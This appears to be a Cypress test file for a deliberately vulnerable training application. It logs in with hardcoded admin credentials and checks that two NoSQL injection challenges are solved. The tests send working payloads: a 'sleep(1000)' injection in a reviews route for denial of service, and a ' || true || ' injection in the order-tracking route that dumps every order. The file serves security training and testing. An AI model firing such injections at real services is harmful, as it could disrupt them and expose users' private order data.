describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })
    it('should be possible to inject a command into the get route', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(() => {
            void fetch(
              `${Cypress.config('baseUrl')}/rest/products/sleep(1000)/reviews`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL DoS' })
        }
      })
    })
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should be possible to inject and get all the orders', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            await fetch(
              `${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL Exfiltration' })
        }
      })
    })
  })
})
